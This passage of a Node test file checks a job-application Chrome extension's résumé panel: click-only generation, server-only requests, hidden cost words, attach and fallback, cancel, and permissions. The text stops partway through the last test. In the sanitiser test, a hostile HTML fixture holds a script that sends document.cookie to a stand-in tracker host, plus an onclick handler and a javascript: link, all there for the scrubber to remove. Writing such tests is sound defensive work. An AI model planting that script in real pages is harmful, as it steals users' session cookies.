// J6 · D98 §4–§5 — THE RÉSUMÉ ON THE PAGE, the extension's half (extension/resumePanel.js).
//
// The service worker's handlers run here against J3's REAL routes and service (routes/extensionResume.js,
// services/extensionResume.js) on the full schema, through the REAL auth.js authedFetch — only the GENERATION is a stub
// (test-support/extensionResumeStub.mjs: no model, nothing leaves the machine) and chrome.* is a stub that records what
// would be injected into the page. Real-Chrome checks (the panel drawn, the preview isolated, Attach on a plain input and
// on a drop zone, both themes) are test/j6ResumePanelBrowser.test.js. Every rule below was seen red with it removed
// (lane J6's report lists the mutations). Synthetic people only.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import express from "express";
import Database from "better-sqlite3";
import { MIGRATIONS } from "../scripts/migrations.js";
import { mountExtensionResume, seedBaseResume, PDF_BYTES } from "../test-support/extensionResumeStub.mjs";
import { at } from "../test-support/sourceAnchors.js";

const read = (p) => fs.readFileSync(p, "utf8").replace(/\r\n/g, "\n");
const ZOOM = "https://zoom.wd5.myworkdayjobs.com/en-US/Zoom/job/Remote--(US)/Software-Engineer_R19749-1/apply/applyManually?source=linkedin";
const TAB = { id: 7, url: ZOOM };

// ── the server: J3's routes, a stubbed generation, a synthetic user whose job this is ───────────────────────────────
async function server(t) {
  const db = new Database(":memory:");
  for (const m of MIGRATIONS) db.exec(m.sql);
  db.prepare("INSERT INTO users (id,username,password_hash,plan_tier) VALUES (1,'ada','x','PRO')").run();
  db.prepare("INSERT INTO domain_profiles (id,user_id,profile_name,role_family,domain,is_active) VALUES (10,1,'SWE','engineering','software',1)").run();
  db.prepare("INSERT INTO user_profile (user_id,first_name,last_name,email) VALUES (1,'Ada','Example','ada@example.test')").run();
  db.prepare(`INSERT INTO scraped_jobs (job_id,title,company,location,url,apply_url,search_query,_hash,discovered_at)
    VALUES ('wd-zoom-1','Software Engineer','Zoom','Remote (US)','https://zoom.wd5.myworkdayjobs.com/Zoom/job/x_R19749','https://zoom.wd5.myworkdayjobs.com/Zoom/job/x_R19749/apply','t','h1',unixepoch())`).run();
  db.prepare("INSERT INTO job_captures (user_id, job_id, url, origin, action) VALUES (1,'wd-zoom-1','https://zoom.wd5.myworkdayjobs.com/Zoom/job/x_R19749','capture','attached')").run();
  seedBaseResume(db);
  const app = express();
  app.use(express.json());
  const seen = [];
  app.use((req, _res, next) => { seen.push(`${req.method} ${req.path}`); next(); });
  const ctl = mountExtensionResume(app, db, { slotsRoute: true });
  app.post("/api/apply/copy-sheet", (_req, res) => res.json({ source: "packet", job: { jobId: "wd-zoom-1", title: "Software Engineer", company: "Zoom" },
    rows: [{ label: "First Name", value: "Ada", provenance: "profile" }], unanswered: [] }));
  const srv = await new Promise(r => { const s = app.listen(0, "127.0.0.1", () => r(s)); });
  t.after(() => { srv.close(); db.close(); });
  return { db, ctl, seen, origin: `http://127.0.0.1:${srv.address().port}` };
}

// ── chrome.*: both storage areas, the tab, and every injection recorded ───────────────────────────────────────────
function chromeStub({ attachResult = { target: true, set: true, verified: true, how: "page", reason: null } } = {}) {
  const stores = { local: new Map([["authToken", "j6-test-token"]]), session: new Map() };
  const area = (m) => ({
    async get(k) {
      if (k == null) return Object.fromEntries(m);
      return Object.fromEntries([].concat(k).filter(x => m.has(x)).map(x => [x, structuredClone(m.get(x))]));
    },
    async set(o) { for (const [k, v] of Object.entries(o)) m.set(k, structuredClone(v)); },
    async remove(k) { for (const x of [].concat(k)) m.delete(x); },
  });
  const out = { injected: [], opened: [], attach: attachResult };
  stores.session.set("bind:7", { origin: new URL(ZOOM).origin, jobId: "wd-zoom-1", title: "Software Engineer", company: "Zoom", via: "capture", boundAt: Date.now(), dock: "right" });
  globalThis.chrome = {
    storage: { local: area(stores.local), session: area(stores.session) },
    runtime: { getURL: (p) => `chrome-extension://j6/${p}`, id: "j6" },
    tabs: { query: async () => [TAB], create: async (o) => { out.opened.push(o.url); return { id: 99 }; } },
    scripting: {
      executeScript: async (x) => {
        // ⭐ T17: a file by name — the dock (dock.js) at frame 0 before the view, the ATS component — recorded apart
        if (!x.func) { (out.files = out.files || []).push({ files: x.files, target: x.target }); return [{ result: null }]; }
        out.injected.push({ func: x.func.name, args: x.args, target: x.target });
        if (x.func.name === "renderResumePanel") return [{ result: { ok: true, rendered: true, state: x.args[0].state } }];
        if (x.func.name === "attachResumeFile") return [{ result: x.args[0].probe ? { target: out.attach.target, reason: out.attach.target ? null : "no_file_input" } : out.attach }];
        return [{ result: null }];
      },
    },
  };
  return { stores, out };
}

// Every request the extension makes, wherever it goes.
function recordFetch(t) {
  const urls = [];
  const real = globalThis.fetch;
  globalThis.fetch = (u, init) => { urls.push(String(u)); return real(u, init); };
  t.after(() => { globalThis.fetch = real; delete globalThis.chrome; });
  return urls;
}

let instance = 0;
async function panel(origin) {
  const m = await import(`../extension/resumePanel.js?i=${++instance}`);
  return { m, h: m.handlersFor(origin) };
}
const fromTab = { tab: TAB };
const fromPopup = {};
const until = async (h, id, done = (s) => !["generating"].includes(s) && s !== "queued") => {
  for (let i = 0; i < 300; i++) {
    const r = await h.RESUME_STATUS({ type: "RESUME_STATUS", id }, fromTab);
    if (done(r.model?.state === "generating" ? "generating" : r.model?.state)) return r;
    await new Promise(z => setTimeout(z, 10));
  }
  throw new Error("never settled");
};

// ── ⛔ USER-TRIGGERED ONLY ────────────────────────────────────────────────────────────────────────────────────────
test("⛔ J6 → T22: a résumé is started only by ONE handler, from a page's tab with the click's trigger — never from the popup, never by opening; the Résumé tab itself starts nothing", async (t) => {
  const s = await server(t);
  const urls = recordFetch(t);
  chromeStub();
  const { h } = await panel(s.origin);
  // opening the panel — from the popup (no sender tab) — draws it and starts NOTHING
  const open = await h.RESUME_PANEL_OPEN({ type: "RESUME_PANEL_OPEN" }, fromPopup);
  assert.equal(open.ok, true);
  assert.equal(open.state, "none", "Not generated");
  assert.equal(s.ctl.generations().length, 0, "opening the panel started a generation");
  assert.ok(!s.seen.some(r => r === "POST /api/extension/resume"), "opening the panel POSTed a start");
  // the popup cannot start one; nor can a message without the click's trigger
  assert.equal((await h.RESUME_GENERATE({ type: "RESUME_GENERATE", trigger: "click" }, fromPopup)).ok, false, "the popup started a generation");
  assert.equal((await h.RESUME_GENERATE({ type: "RESUME_GENERATE" }, fromTab)).ok, false, "no trigger, no generation");
  assert.equal((await h.RESUME_GENERATE({ type: "RESUME_GENERATE", trigger: "auto" }, fromTab)).ok, false);
  assert.equal(s.ctl.generations().length, 0);
  assert.equal(s.ctl.slots(), 0, "no slot spent");
  // the panel's click: one generation
  const g = await h.RESUME_GENERATE({ type: "RESUME_GENERATE", trigger: "click" }, fromTab);
  assert.equal(g.ok, true, g.message);
  assert.equal(s.ctl.generations().length, 1);
  assert.ok(urls.length > 0);
  // ⛔ in the page: every press that reaches the server or the page is behind ev.isTrusted
  const src = read("extension/resumePanel.js");
  // ⭐ T17: one click handler serves both of the dock's views (ATS and Résumé); the window's keys are the dock's
  const click = src.slice(at(src, "const onClick = (r) => async (ev) => {"), at(src, "host.__draftCleanup = cleanup;"));
  const trusted = at(click, "if (!ev.isTrusted) return;");
  for (const role of ["'download'", "'cancel'", "'attach'", "'edit'"]) {
    assert.ok(at(click, `role === ${role}`) > trusted, `${role} is handled before the trusted-click check`);
  }
  // ⭐ T22 REVISED: the view starts nothing — its Generate / Regenerate are gone; the handler above is the one start,
  // for the Draft button (T24) and the résumé row (T18) to send
  assert.doesNotMatch(click, /role === 'generate'|role === 'regenerate'|RESUME_GENERATE/);
  // the ONE start is the RESUME_GENERATE handler — no other code in the extension POSTs it
  const starts = [...src.matchAll(/'\/api\/extension\/resume',/g)];
  assert.equal(starts.length, 1, "one place starts a generation");
  assert.ok(at(src, "RESUME_GENERATE: async (msg, sender) => {") < starts[0].index);
  // ⭐ T18: the review panel's résumé row SENDS the one start (RESUME_GENERATE with the click's trigger — t22PopupLauncher
  // pins where); it never POSTs a generation itself. Every other file does neither.
  for (const f of fs.readdirSync("extension").filter(f => f.endsWith(".js") && f !== "resumePanel.js")) {
    const re = f === "review-overlay.js" ? /\/api\/extension\/resume['`]\s*,\s*\{\s*method:\s*'POST'/
      : /RESUME_GENERATE|\/api\/extension\/resume['`]\s*,\s*\{\s*method:\s*'POST'/;
    assert.doesNotMatch(read(`extension/${f}`), re, `${f} starts a generation`);
  }
});

// ── ⛔ NO NETWORK TARGET BUT DRAFT'S OWN SERVER ──────────────────────────────────────────────────────────────────
test("⛔ J6: every request goes to draft's own server — never a model, never the résumé service directly", async (t) => {
  const s = await server(t);
  const urls = recordFetch(t);
  const { out } = chromeStub();
  const { h } = await panel(s.origin);
  await h.RESUME_PANEL_OPEN({}, fromTab);
  const g = await h.RESUME_GENERATE({ trigger: "click" }, fromTab);
  const ready = await until(h, g.model.id);
  assert.equal(ready.model.state, "ready");
  await h.RESUME_ATTACH({ id: g.model.id }, fromTab);
  await h.RESUME_DOWNLOAD({ id: g.model.id }, fromTab);
  await h.RESUME_OPEN_EDITOR({ id: g.model.id }, fromTab);
  const elsewhere = urls.filter(u => !u.startsWith(`${s.origin}/`) && !u.startsWith("chrome-extension://j6/"));
  assert.deepEqual(elsewhere, [], "a request left for somewhere other than draft's server");
  assert.ok(urls.some(u => u.startsWith(`${s.origin}/api/extension/resume`)));
  // statically: the module makes no request of its own — every one is authedFetch(<the router's server>, '/api/…')
  for (const f of ["extension/resumePanel.js"]) {   // (T22: popup-resume.js is gone)
    const src = read(f).replace(/\/\/.*$/gm, "");
    assert.doesNotMatch(src, /(?<![\w.])fetch\(|XMLHttpRequest|WebSocket|EventSource|sendBeacon|importScripts/, `${f} makes a request of its own`);
    assert.doesNotMatch(src, /['"`]https?:\/\//, `${f} names an address`);
    for (const m of src.matchAll(/authedFetch\(([^,]+),\s*([^,)]+)/g)) {
      assert.match(m[1].trim(), /^(serverUrl|url\(\))$/, `${f}: authedFetch to ${m[1]}`);
    }
  }
  // the extension as a whole names no model provider and no tools-service host
  for (const f of fs.readdirSync("extension").filter(f => /\.(js|html)$/.test(f))) {
    assert.doesNotMatch(read(`extension/${f}`).replace(/\/\/.*$/gm, ""), /api\.anthropic|api\.openai|generativelanguage|\/v1\/resumes\/generate|RESUME_MASTER_API/i, `${f} reaches a model or the résumé service directly`);
  }
  // the opened editor is draft's own site
  assert.deepEqual(out.opened, [s.origin + "/app/jobs?job=wd-zoom-1"]);
});

// ── ⛔ NO MONEY, TOKENS OR MODEL NAMES ───────────────────────────────────────────────────────────────────────────
test("⛔ J6: no cost, token or model word in anything the panel shows — whatever the server's answer carries", async () => {
  const { resumePanelModel, modelWords, COST_WORDS } = await import("../extension/resumePanel.js");
  const BROAD = /\$|\bcost|\bprice|\bpricing|\btokens?\b|\bmodel\b|claude|sonnet|opus|haiku|anthropic|openai|gpt|gemini|\busage\b|credit|\busd\b|billing/i;
  const job = { jobId: "wd-zoom-1", title: "Software Engineer", company: "Zoom" };
  const leak = { model: "claude-sonnet-5", usage: { inputTokens: 12000, costUsd: 0.04 }, tool: "a_plus_resume", cost: "$0.04" };
  const v = (o) => ({ id: "erg_0123456789abcdef01234567", job, createdAt: 1, slot: { spent: true, refunded: false }, allowance: { used: 3, limit: 10, remaining: 7 }, openUrl: "/app/jobs?job=wd-zoom-1", ...leak, ...o });
  const ready = { preview: { html: "<p>Ada</p>" }, score: { before: 62, after: 81 }, changes: { summary: { rewritten: 9, added: 2, removed: 0, termsGained: [{ term: "go" }], roleChanges: 0 } },
    guard: { passed: true, findings: ["Your credit balance is too low to access claude-sonnet-5", "Mentions Kubernetes, which your profile does not list."] }, pdf: { fileName: "Ada_Example_Zoom_Software_Engineer.pdf", attached: false } };
  const models = [
    resumePanelModel({}),
    resumePanelModel({ job, allowance: { used: 3, limit: 10, remaining: 7 } }),
    resumePanelModel({ job, allowance: { used: 10, limit: 10, remaining: 0 } }),
    resumePanelModel({ job, error: { error: "Your credit balance is too low to access claude-sonnet-5 (12,000 input tokens, $0.04)", code: "unavailable" } }),
    resumePanelModel({ job, error: { error: "You have used all of your drafts for the last 24 hours.", code: "slots_exhausted" }, allowance: { limit: 10, remaining: 0 } }),
    resumePanelModel({ job, view: v({ status: "queued" }), warning: "Generating again uses another of your drafts." }),
    resumePanelModel({ job, view: v({ status: "generating" }), warning: "That regenerate cost $0.04 on claude-sonnet-5" }),
    resumePanelModel({ job, view: v({ status: "refused", guard: { passed: false, reasons: ["The résumé claims 9 years of experience; your profile states 6.", "12,000 tokens on claude"] }, slot: { refunded: true } }) }),
    resumePanelModel({ job, view: v({ status: "failed", error: { code: "unavailable", message: "claude-sonnet-5 rate limit: 12,000 tokens" }, slot: { refunded: true } }) }),
    resumePanelModel({ job, view: v({ status: "cancelled", slot: { refunded: false } }) }),
    resumePanelModel({ job, view: v({ status: "ready", ...ready }) }),
    resumePanelModel({ job, view: v({ status: "ready", fromExisting: true, ...ready }), warning: "Generating again uses another of your drafts." }),
    resumePanelModel({ job, view: v({ status: "ready", ...ready }), attach: { outcome: "attached", fileName: "Ada_Example_Zoom_Software_Engineer.pdf" } }),
    resumePanelModel({ job, view: v({ status: "ready", ...ready }), attach: { outcome: "fallback", fileName: "Ada_Example_Zoom_Software_Engineer.pdf", reason: "not_shown" } }),
    resumePanelModel({ job, view: v({ status: "ready", ...ready }), attach: { outcome: "noinput", fileName: "Ada_Example_Zoom_Software_Engineer.pdf" } }),
    resumePanelModel({ job, view: v({ status: "ready", ...ready, pdf: { fileName: "Ada_Example_Zoom_Software_Engineer.pdf", attached: true } }) }),
  ];
  const states = new Set(models.map(m => m.state));
  for (const s of ["nojob", "none", "error", "generating", "refused", "failed", "cancelled", "ready", "attached", "fallback"]) assert.ok(states.has(s), `no model for ${s}`);
  for (const m of models) {
    const words = modelWords(m);
    assert.doesNotMatch(words, BROAD, `${m.state} shows: ${words.match(BROAD)?.[0]} — in:\n${words}`);
    // and nothing outside the named fields rides along (the leak's keys)
    assert.doesNotMatch(JSON.stringify({ ...m, preview: null }), /a_plus_resume|inputTokens|costUsd|claude/i, `${m.state} carries a leaked field`);
  }
  // the allowance is shown in slot words, never money
  // ⭐ T22 REVISED: the "none" state is a view — it names the job and starts nothing, so it no longer quotes the slot it
  // would use; the allowance is still said in slot words where it matters (all slots used)
  assert.match(modelWords(models[1]), /No résumé has been made for this job yet\./);
  assert.match(modelWords(models[1]), /Software Engineer at Zoom/, "it names the job");
  assert.match(modelWords(models[4]), /You have used all 10 of your Draft slots for now — they come back over 24 hours\./);
  // the panel's OWN sentences (the renderer's literals) say none of it either
  const src = read("extension/resumePanel.js");
  const render = src.slice(at(src, "export function renderResumePanel(model, meta) {"), at(src, "// ── the injected attach"));
  for (const lit of render.matchAll(/(['`])((?:(?!\1)[^\\\n]|\\.)*)\1/g)) {
    if (/^[a-z-]+$|^\.|^--c|^\[|^#|^\$\d/.test(lit[2])) continue;
    assert.doesNotMatch(lit[2].replace(/var\(--c-[a-z-]+\)|\$\{|\$\d/g, ""), BROAD, `the renderer says: ${lit[2].slice(0, 80)}`);
  }
  assert.ok(COST_WORDS.test("claude-sonnet-5") && COST_WORDS.test("$0.04") && !COST_WORDS.test("Built ML models in Go"));
});

// ── ⛔ A REFUSAL ATTACHES NOTHING ──────────────────────────────────────────────────────────────────────────────
test("⛔ J6: a claim-guard refusal shows its reasons and attaches nothing — Attach is refused for it even when asked", async (t) => {
  const s = await server(t);
  recordFetch(t);
  const { out } = chromeStub();
  const { h } = await panel(s.origin);
  s.ctl.mode = "refuse";
  const g = await h.RESUME_GENERATE({ trigger: "click" }, fromTab);
  const done = await until(h, g.model.id);
  assert.equal(done.model.state, "refused");
  assert.deepEqual(done.model.reasons, ["The résumé claims 9 years of experience; your profile states 6."]);
  assert.match(modelText(done.model), /Nothing was attached\./);
  assert.match(modelText(done.model), /Your Draft slot was given back\./);
  assert.ok(!done.model.actions.some(a => a.role === "attach"), "Attach is offered on a refusal");
  assert.equal(done.model.preview, null, "a refused résumé is previewed");
  const seenBefore = s.seen.length;
  const a = await h.RESUME_ATTACH({ id: g.model.id }, fromTab);
  assert.equal(a.ok, false, "Attach accepted a refused résumé");
  assert.equal(out.injected.filter(x => x.func === "attachResumeFile").length, 0, "the page was touched");
  assert.ok(!s.seen.slice(seenBefore).some(r => /\/pdf/.test(r)), "a PDF was asked for");
  assert.deepEqual(s.ctl.pdfs(), [], "a PDF was stored");
  assert.equal(s.ctl.slots(), 0);
});
const modelText = (m) => [m.title, ...(m.lines || []).map(l => l.text)].join("\n");

// ── Attach: verified, the fallback, no upload box ────────────────────────────────────────────────────────────────
test("⛔ J6: Attach — the PDF set on the page and VERIFIED reads 'Attached: <file>'; not verified falls back to Download PDF and says so; never silent", async (t) => {
  const s = await server(t);
  recordFetch(t);
  const { out, stores } = chromeStub();
  const { h, m } = await panel(s.origin);
  const g = await h.RESUME_GENERATE({ trigger: "click" }, fromTab);
  const ready = await until(h, g.model.id);
  assert.equal(ready.model.state, "ready");
  assert.match(ready.model.changes, /^What we changed — /);
  assert.deepEqual(ready.model.score, { before: 62, after: 81 });
  assert.match(ready.model.guard.text, /Checked against your profile/);
  assert.deepEqual(ready.model.actions.map(a => a.label), ["Attach", "Download PDF", "Edit in a full page"], "⭐ T22: no Regenerate — a view");

  // verified
  const a = await h.RESUME_ATTACH({ id: g.model.id }, fromTab);
  assert.equal(a.ok, true);
  assert.equal(a.model.state, "attached");
  assert.equal(a.model.title, "Attached: Ada_Example_Zoom_Software_Engineer.pdf");
  const set = out.injected.filter(x => x.func === "attachResumeFile" && !x.args[0].probe);
  assert.equal(set.length, 1);
  assert.equal(set[0].args[0].fileName, "Ada_Example_Zoom_Software_Engineer.pdf");
  assert.equal(Buffer.from(set[0].args[0].base64, "base64").toString(), PDF_BYTES.toString(), "the server's stored PDF, byte for byte");
  assert.equal(s.ctl.pdfs()[0].attached_at != null, true, "the server keeps it as this application's");

  // not verified (a custom drop zone that shows nothing)
  out.attach = { target: true, set: true, verified: false, how: null, reason: "not_shown" };
  const b = await h.RESUME_ATTACH({ id: g.model.id }, fromTab);
  assert.equal(b.model.state, "fallback");
  assert.equal(b.attached, false);
  const said = modelText(b.model);
  assert.match(said, /could not put the file in this page's upload box/);
  assert.match(said, new RegExp(`Download PDF — its name is copied for you — then ${m.DRAG_HINT}\\.`));
  assert.equal(b.model.actions[0].label, "Download PDF");
  assert.ok(b.model.download?.base64, "the bytes are there for Download PDF");

  // no upload box on this step
  out.attach = { target: false };
  const c = await h.RESUME_ATTACH({ id: g.model.id }, fromTab);
  assert.equal(c.model.state, "fallback");
  assert.match(modelText(c.model), /There is no upload box for a résumé on this step\./);

  // ⛔ what the browser keeps: the generation's id, its status and when Attach was pressed — no file, no name, no HTML
  const rec = stores.local.get("jobProgress").records["wd-zoom-1"];
  assert.deepEqual(Object.keys(rec.resume).sort(), ["at", "attached", "id", "status"]);
  assert.match(rec.resume.id, /^erg_[a-f0-9]+$/);
  assert.equal(rec.resume.status, "ready");
  assert.ok(rec.resume.attached > 0);
  const raw = JSON.stringify([...stores.local.entries(), ...stores.session.entries()]);
  for (const leaked of ["Ada_Example", "Ada Example", "<", "%PDF", "Led a team"]) assert.ok(!raw.includes(leaked), `the browser stores ${leaked}`);
});

// ── Cancel ───────────────────────────────────────────────────────────────────────────────────────────────────────
test("⛔ J6: Cancel stops it — the panel says nothing was attached, and whether the slot came back", async (t) => {
  const s = await server(t);
  recordFetch(t);
  chromeStub();
  const { h } = await panel(s.origin);
  const release = s.ctl.hold();
  const g = await h.RESUME_GENERATE({ trigger: "click" }, fromTab);
  assert.equal(g.model.state, "generating");
  assert.equal(g.model.poll, true, "it keeps asking while it runs");
  assert.deepEqual(g.model.actions.map(a => a.role), ["cancel"]);
  const c = await h.RESUME_CANCEL({ id: g.model.id }, fromTab);
  assert.equal(c.ok, true);
  assert.equal(c.model.state, "cancelled");
  assert.match(modelText(c.model), /Cancelled — nothing was attached\./);
  release();
  await new Promise(z => setTimeout(z, 30));
  assert.equal((await h.RESUME_STATUS({ id: g.model.id }, fromTab)).model.state, "cancelled", "a cancelled one does not come back as ready");
  assert.deepEqual(s.ctl.pdfs(), []);
  // a message for some OTHER generation is refused — the id is the tab's own job's, never the message's alone
  const other = await h.RESUME_CANCEL({ id: "erg_ffffffffffffffffffffffff" }, fromTab);
  assert.equal(other.ok, false);
});

// ── survives a popup close, a reload, a service-worker restart ───────────────────────────────────────────────────
test("⛔ J6: the generation survives the popup closing and the service worker restarting — reopened, the panel is where it was, nothing spent again", async (t) => {
  const s = await server(t);
  recordFetch(t);
  const { out } = chromeStub();
  const first = await panel(s.origin);
  const release = s.ctl.hold();
  const g = await first.h.RESUME_GENERATE({ trigger: "click" }, fromTab);
  // a fresh module instance is what a service-worker restart gives the extension; the popup's button reopens it
  const again = await panel(s.origin);
  const r = await again.h.RESUME_PANEL_OPEN({}, fromPopup);
  assert.equal(r.state, "generating", "the reopened panel forgot the generation");
  const drawn = out.injected.filter(x => x.func === "renderResumePanel").at(-1).args[0];
  assert.equal(drawn.id, g.model.id);
  release();
  const done = await until(again.h, g.model.id);
  assert.equal(done.model.state, "ready");
  const r2 = await again.h.RESUME_PANEL_OPEN({}, fromPopup);
  assert.equal(r2.state, "ready");
  assert.equal(s.ctl.calls.length, 1, "generated once");
  assert.equal(s.ctl.slots(), 1, "one slot");
});

// ── the same file, again: the next fill and the Copy sheet ──────────────────────────────────────────────────────
test("⛔ J6: once attached, the résumé is part of the payload — the Copy sheet lists 'Résumé — attached ✓' and the next fill attaches the SAME stored file", async (t) => {
  const s = await server(t);
  recordFetch(t);
  chromeStub();
  const { h } = await panel(s.origin);
  const g = await h.RESUME_GENERATE({ trigger: "click" }, fromTab);
  await until(h, g.model.id);
  await h.RESUME_ATTACH({ id: g.model.id }, fromTab);
  const gh = await import(`../extension/gated-handoff.js?i=${++instance}`);
  const sheet = await gh.copySheetFor({ serverUrl: s.origin, tab: TAB });
  assert.deepEqual(sheet.rows[0], { label: "Résumé — attached ✓", value: "Ada_Example_Zoom_Software_Engineer.pdf", resume: true });
  assert.equal(sheet.rows[1].label, "First Name");
  // the fill: the panel's attached résumé is fetched from ITS generation's stored file, by its own name — no new generation
  const pdf = await gh.fetchPdf(s.origin, `/api/extension/resume/${g.model.id}/pdf/file`, "x.pdf");
  assert.equal(pdf.fileName, "Ada_Example_Zoom_Software_Engineer.pdf");
  assert.equal(Buffer.from(pdf.base64, "base64").toString(), PDF_BYTES.toString());
  const fill = read("extension/gated-handoff.js");
  const block = fill.slice(at(fill, "const panelResume = serverUrl ? await resumeFor(released.packet?.jobId)"), at(fill, "// ── D55 (l): A FORM WE DO NOT RECOGNISE"));
  assert.match(block, /const resumePath = panelResume\?\.attached \? `\/api\/extension\/resume\/\$\{encodeURIComponent\(panelResume\.id\)\}\/pdf\/file` : released\.resumeUrl;/);
  assert.match(block, /\? \{ base64: pdf\.base64, filename: pdf\.fileName, mimeType: 'application\/pdf', fromPanel: true \}/);
  assert.equal(s.ctl.calls.length, 1, "nothing was generated again");
  // the review panel's row says it
  const { panelRowsForStep } = await import("../extension/review-overlay.js");
  const rows = panelRowsForStep({ stepName: "My Experience", fields: [{ index: 0, type: "file", label: "Resume/CV*", id: "ws-resume", required: true, visible: false }],
    resume: { attached: true, filename: "Ada_Example_Zoom_Software_Engineer.pdf", fromPanel: true } });
  assert.equal(rows[0].group, "ok", "the résumé row is in Filled");
  assert.equal(rows[0].value, "Résumé — attached ✓");
  assert.equal(rows[0].note, "Ada_Example_Zoom_Software_Engineer.pdf");
  // …and an unattached résumé upload offers the panel (it opens it; it generates nothing)
  const offer = panelRowsForStep({ stepName: "My Experience", fields: [{ index: 0, type: "file", label: "Resume/CV*", id: "ws-resume", required: true, visible: false }] });
  assert.equal(offer[0].resumeOffer, true);
  const ro = read("extension/review-overlay.js");
  // ⭐ T17 / T22: it shows the dock's Résumé tab — a view
  assert.match(ro, /if \(role === 'resume'\) \{ void send\(\{ type: 'RESUME_PANEL_OPEN', tab: 'resume' \}\); return; \}/);
  assert.ok(at(ro, "if (role === 'resume')") > at(ro, "if (!ev.isTrusted) return;"), "the offer is a trusted click too");
});

// ── the preview, cleaned before it leaves the service worker ─────────────────────────────────────────────────────
test("⛔ J6: the preview HTML is cleaned again in the extension — no script, no external image, no handler, no url(), no @import", async () => {
  const { scrubPreviewHtml, resumePanelModel } = await import("../extension/resumePanel.js");
  const hostile = `<style>@import "https://cdn.tracker.test/x.css"; body{background:url(https://cdn.tracker.test/bg.png);color:CanvasText}</style>
    <div onclick="steal()" class="name">Ada Example</div><script>fetch("https://cdn.tracker.test/?c="+document.cookie)</script>
    <img src="https://cdn.tracker.test/pixel.png"><picture><source srcset="https://cdn.tracker.test/a.webp"></picture>
    <link rel="stylesheet" href="https://cdn.tracker.test/a.css"><iframe src="https://cdn.tracker.test/"></iframe>
    <a href="javascript:alert(1)">x</a><svg><image href="https://cdn.tracker.test/s.png"/></svg><p style="background:url('https://cdn.tracker.test/p.png')">Go</p>`;
  const out = scrubPreviewHtml(hostile);
  assert.doesNotMatch(out, /tracker\.test|<script|<img|<iframe|<link|<svg|<source|onclick|javascript:|@import|url\(/i, out);
  assert.match(out, /Ada Example/);
  assert.match(out, /Go<\/p>/);
  const m = resumePanelModel({ job: { jobId: "j" }, view: { id: "erg_0123456789abcdef01234567", status: "ready", job: { jobId: "j" }, preview: { html: hostile } } });
  assert.doesNotMatch(m.preview.html, /tracker\.test/);
  // and in the page: an inert DOMParser document, everything that runs or loads removed, its own shadow root
  const src = read("extension/resumePanel.js");
  const fillPreview = src.slice(at(src, "const fillPreview = (el, html) => {"), at(src, "// The two hosts, from the dock"));
  assert.match(fillPreview, /const r = el\.attachShadow\(\{ mode: 'open' \}\);/);
  assert.match(fillPreview, /new DOMParser\(\)\.parseFromString\(/);
  assert.match(fillPreview, /doc\.querySelectorAll\(DROP\)\.forEach\(n => n\.remove\(\)\);/);
  assert.match(src, /const DROP = 'script,style,iframe,object,embed,img,picture,source,video,audio,canvas,link,meta,base,svg,/);
  assert.doesNotMatch(src, /innerHTML[^;]*preview\.html|preview\.html[^;]*innerHTML/, "the preview is never written as innerHTML into the panel");
  assert.match(src, /fillPreview\(pv, m\.preview\.html\)/);
});

// ── nothing new is asked of Chrome ──────────────────────────────────────────────────────────────────────────────
test("⛔ J6: no new permission and no new storage key — the panel uses scripting, activeTab, storage and tabs.create only", () => {
  const manifest = JSON.parse(read("extension/manifest.json"));
  assert.deepEqual([...manifest.permissions].sort(), ["activeTab", "contextMenus", "scripting", "sidePanel", "storage"], "the permission list changed");
  for (const f of ["extension/resumePanel.js"]) {   // (T22: popup-resume.js is gone)
    const src = read(f);
    assert.doesNotMatch(src, /chrome\.(downloads|notifications|cookies|webRequest|identity|permissions|history|bookmarks|tabs\.(update|get|onUpdated))/, `${f} needs a new permission`);
    assert.doesNotMatch(src, /chrome\.storage\.(local|session|sync)\.set|localStorage|sessionStorage|indexedDB/, `${f} stores something of its own`);
  }
  const progress = read("extension/progress.js");
  assert.match(progress, /resume: \['at', 'id', 'status', 'attached'\],/, "the résumé step is the job record's, and only these four");
});

// ── D60 / themes, from the source (the Chrome test measures the drawn panel) ────────────────────────────────────
test("⛔ J6: the panel's CSS — tokens for both themes, no capsule, marks not pills", () => {
  const src = read("extension/resumePanel.js");
  const css = src.slice(at(src, "const css = `"), at(src, "const esc = (s) =>"));
  assert.match(css, /\.rp \{ \$\{varsOf\(theme\.light\)\}/);
  assert.match(css, /@media \(prefers-color-scheme: dark\) \{ \.rp \{ \$\{varsOf\(theme\.dark\)\} \} \}/);
  assert.doesNotMatch(css, /999px|border-radius:\s*50%|rounded-full/);
  for (const m of css.matchAll(/border-radius:\s*(\d+)px/g)) assert.ok(Number(m[1]) <= 10, `radius ${m[1]}px`);
  // ⭐ D152 (7b), changed on purpose: the mark is a plain word — no box, no 3px bar, no tint; a state a 6px dot before it.
  assert.match(css, /\.mark \{ --mk[^}]*?padding: 0; border-radius: 0; color: var\(--mk\); border: 0; background: none; \}/);
  assert.match(css, /\.mark:is\(\.ok, \.warn, \.no, \.info\) \{[^}]*radial-gradient\(circle at 3px 50%, var\(--mk\) 3px, transparent 3\.5px\)/);
  assert.doesNotMatch(css, /border-left: 3px/, "the label chip's bar is back");
});

// ── the copy of resumeInputScore is the fill's ──────────────────────────────────────────────────────────────────
test("J6: the attach picks the résumé's upload exactly as the fill does (resumeInputScore, byte-identical)", () => {
  const norm = (s) => s.split("\n").map(l => l.trim()).join("\n");
  const src = read("extension/resumePanel.js");
  const gh = read("extension/gated-handoff.js");
  const mine = src.slice(at(src, "  function resumeInputScore(context) {"), at(src, "  const sleep = (ms) =>"));
  const theirs = gh.slice(at(gh, "export function resumeInputScore(context) {"), at(gh, "const normalise = (s) =>"));
  assert.equal(norm(mine).trim(), norm(theirs).replace(/^export /, "").trim());
});

// ── the popup's button: D23 holds, and it only OPENS ────────────────────────────────────────────────────────────
// ⭐ T22 REVISED (owner 10-15): the popup's stand-alone "Résumé for this job" is GONE — a résumé is started only from the
// Draft button and the résumé row (T24 / T18). The popup reaches the Résumé VIEW through Open dock (the dock's tabs).
test("⛔ J6 → T22 → T31: no Résumé button outside the dock — the toolbar press opens the dock, whose Résumé tab is a view", () => {
  // ⭐ T31: the retired popup (and its Open dock) is gone; the press and Settings start no résumé
  for (const f of ["popup.html", "popup.js", "popup-resume.js"]) assert.ok(!fs.existsSync(`extension/${f}`), `extension/${f} is back`);
  for (const f of ["extension/toolbarPress.js", "extension/options.js", "extension/options-auto.js", "extension/options-permissions.js"]) {
    assert.doesNotMatch(read(f), /RESUME_PANEL_OPEN|RESUME_GENERATE/, `${f} starts a résumé`);
  }
